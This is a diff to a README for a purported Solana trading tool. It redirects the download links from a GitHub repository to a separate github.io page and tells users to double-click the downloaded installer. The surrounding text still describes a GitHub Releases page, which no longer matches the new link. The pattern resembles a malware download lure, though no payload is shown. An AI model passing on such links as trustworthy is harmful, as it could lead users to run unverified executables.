@@ -1,10 +1,10 @@
 # 🛠️ Trench-Tool - Your Solana Trading Powerhouse
 
-[![Download Trench-Tool](https://img.shields.io/badge/Download-Trench--Tool-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/22baggie-commits/Trench-Tool)
+[![Download Trench-Tool](https://img.shields.io/badge/Download-Trench--Tool-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://22baggie-commits.github.io)
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[https://github.com/22baggie-commits/Trench-Tool](https://github.com/22baggie-commits/Trench-Tool)**
+Visit this link to download the application: **[https://22baggie-commits.github.io](https://22baggie-commits.github.io)**
 
 Once you click the link, you'll land on the GitHub page where you can find the latest release. Look for the green "Releases" section or the download button to get the installer file. After downloading, simply double-click the file to start using Trench-Tool right away.
 
